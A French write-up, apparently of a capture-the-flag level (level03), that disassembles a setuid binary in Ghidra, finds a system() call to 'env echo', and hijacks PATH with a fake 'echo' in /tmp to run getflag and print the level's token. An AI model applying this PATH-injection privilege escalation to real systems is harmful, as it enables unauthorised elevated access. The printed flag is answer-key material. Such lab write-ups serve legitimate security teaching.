
ls -la

nous avons un executable

qui si on le lance nous ecrit exploit me 

donc nous allons l'exploit 

pareil que dans l'exo precedant metter le sur votre linux car nous allons devoir utiliser le logiciel GHIDRA

scp level03 vmuller@192.168.1.21:/home/vmuller

install ghidra si vous ne l'avez pas

lancer le ./ghidraRun

cliquer sur la tete de dragon "CodeBrowser"

une fois fait gliser votre executable a l'interieur 

nous avons du code en asm

on vas desasembler le code pour voir ce quil fait 

pour ca clic droit sur le main: desassemble

nous pouvon voir cette phrase 

"/usr/bin/env echo Exploit me"

et cette phrase juste en dessous

CALL       <EXTERNAL>::system                               undefined system()

ca veux dire que le programme fait un appel systheme a une et fait cette commade : "/usr/bin/env echo Exploit me"

c'est genial ca car ils utilisent le env pour pouvoir utiliser echo 

nous pouvons donc rediriger le env vers une autre commande echo que nous avons coder nous meme 

pour ce faire direction le tmp car c'est le seul endrois ou nous pouvons créer des fichier 

cd /tmp

echo whoami > echo

noublier pas de donner les permition au nouveau echo

pour l'instant nous voulons voir quel drois a le programme level03

changer le PATH

export PATH=/tmp:$PATH

comme ca le path sera toujours accesible mais le /tmp sera priviliger

cd 

./level03

et oh tien il a appartien au groupe flag03

on vas donc ganger notre echo pour lui donner une meilleur commande 

cd /tmp

echo getflag > echo

cd 

./level03

merci pour le token !

Check flag.Here is your token : qi0maab88jeaj46qoumi7maus